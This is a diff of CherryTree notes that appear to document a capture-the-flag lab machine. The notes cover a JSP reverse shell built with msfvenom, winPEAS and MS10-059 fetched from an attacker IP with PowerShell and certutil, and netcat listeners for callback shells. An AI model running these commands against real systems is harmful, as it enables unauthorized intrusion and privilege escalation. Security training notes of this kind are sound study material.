@@ -70,7 +70,7 @@ and we get the user flag
         <codebox char_offset="185" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.19 LPORT=4445 -o rev.jsp</codebox>
         <codebox char_offset="279" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">http://10.10.10.11:8500/userfiles/file/exploit.jsp</codebox>
       </node>
-      <node name="privEsc" unique_id="106" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1700411050" ts_lastsave="1700431684">
+      <node name="privEsc" unique_id="106" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1700411050" ts_lastsave="1700431755">
         <rich_text>we will download this </rich_text>
         <rich_text link="webs https://github.com/carlospolop/PEASS-ng/releases/download/20231119-295ce4ea/winPEASany.exe">https://github.com/carlospolop/PEASS-ng/releases/download/20231119-295ce4ea/winPEASany.exe</rich_text>
         <rich_text> to
@@ -137,7 +137,11 @@ and then we run a new listener </rich_text>
         <rich_text justification="left"></rich_text>
         <rich_text>
 
-and then run the following command</rich_text>
+and then run the following command on windows
+
+
+
+</rich_text>
         <codebox char_offset="137" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.14.19/winPEASany.exe','win.exe')"
 </codebox>
         <codebox char_offset="196" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nc -vlp 4448</codebox>
@@ -148,6 +152,7 @@ and then run the following command</rich_text>
         <codebox char_offset="488" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe</codebox>
         <codebox char_offset="538" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">certutil -urlcache -f http://10.10.14.19/MS10-059.exe MS10-059.exe </codebox>
         <codebox char_offset="572" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nc -vlp 4450</codebox>
+        <codebox char_offset="622" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">./MS10-059.exe 10.10.14.19 4450</codebox>
       </node>
     </node>
     <node name="Exploitation" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474629">
